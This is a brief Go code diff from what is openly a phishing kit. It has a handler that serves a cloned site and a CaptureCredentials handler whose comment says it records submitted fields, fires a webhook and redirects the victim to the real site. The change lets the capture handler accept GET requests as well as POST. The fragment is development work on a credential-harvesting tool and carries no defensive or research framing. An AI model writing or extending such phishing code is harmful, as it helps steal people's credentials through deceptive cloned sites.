@@ -36,7 +36,7 @@ func (h *handlers) ServeClone(w http.ResponseWriter, r *http.Request) {
 // CaptureCredentials handles POST /submit — records fields, fires webhook,
 // then redirects the victim to the real site.
 func (h *handlers) CaptureCredentials(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
+	if r.Method != http.MethodPost && r.Method != http.MethodGet {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
